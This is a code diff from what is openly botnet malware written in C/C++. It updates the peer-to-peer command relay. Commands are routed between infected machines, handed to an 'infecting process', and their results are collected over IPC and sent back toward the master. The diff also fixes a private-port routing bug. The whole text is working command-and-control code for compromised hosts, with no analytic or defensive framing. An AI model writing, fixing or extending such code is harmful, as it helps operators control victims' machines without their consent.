@@ -17,7 +17,7 @@
 static SOCKET udp_sock;
 static SOCKET tcp_sock;
 static BotnetNode botnet_topology;
-
+static uint16_t master_commnad_id;
 /* init */
 /*
 * @purpose: Create basic sockets for communication operations.
@@ -128,26 +128,38 @@ void peer_request()
 /* handling incomings */
 static void handle_command(u_char* const data, const struct sockaddr_in& src_addr)
 {
+	/* locals */
 	struct botnet_pack* const command = (struct botnet_pack*)data;
 	
+	/* add the command to the nevigation table */
+	command->numerics.id = botnet_topology.fowardCommand(command->numerics.id, src_addr);
+
+	/* check if the command is intended for this machine */
 	if (command->dst_peer.ip + command->dst_peer.port + command->private_peer.ip + command->private_peer.port == 0)
-		send_command(data, BOTNET_PACK_SIZE);
-	else
+	{
+		master_commnad_id = command->numerics.id; // for retrieving the result
+		send_command(data, BOTNET_PACK_SIZE); // send commnad to the infecting process
+	}
+	else // foward to next machine
 	{
 		BOOL path_status;
-		command->numerics.id = botnet_topology.fowardCommand(command->numerics.id, src_addr);
 		struct sockaddr_in next_peer = botnet_topology.nextPathNode(command->dst_peer, command->private_peer, &path_status);
 		
-		if (path_status)
+		if (path_status) //found next machine
 		{
+			/* check if next is the intended public ip */
 			if (next_peer.sin_addr.s_addr == command->dst_peer.ip && next_peer.sin_port == command->dst_peer.port)
 				command->dst_peer = { 0, 0 };
 
-			if (next_peer.sin_addr.s_addr == command->private_peer.ip && next_peer.sin_port == command->dst_peer.port)
+			/* check if next is the intended private ip */
+			if (next_peer.sin_addr.s_addr == command->private_peer.ip && next_peer.sin_port == command->private_peer.port)
 				command->private_peer = { 0, 0 };
 
+			/* foward the packet */
 			sendto(udp_sock, (char*)data, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&next_peer, sizeof(next_peer));
 		}
+		else // didn't find next: removing from table.
+			botnet_topology.retrieveCommand(command);
 	}
 }
 
@@ -224,7 +236,7 @@ static int handle_udp_connections()
 	for (size_t i = 0; i < adapters_count; i++)
 		if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
 			return 0;
-	
+
 	switch (p->type)
 	{
 	case PACK_TYPE::COMMAND:
@@ -298,3 +310,23 @@ void handle_incomings()
 	}
 }
 /* end handling incomings */
+
+void handle_ipc_results()
+{	
+	/* locals */
+	u_char buffer[900 + sizeof(struct botnet_pack)]; // commnad_result + botnet_pack
+	struct botnet_pack* p = (struct botnet_pack*)buffer;
+	u_char* commnad_result_section = buffer + sizeof(struct botnet_pack);
+
+	while (1)
+	{
+		/* recv commnad result content */
+		recv_result(commnad_result_section, 900);
+		
+		/* add the currect id for retrieving the packet */
+		p->numerics.id = master_commnad_id;
+
+		/* like any command given to the machine */
+		handle_command_result(buffer);
+	}
+}
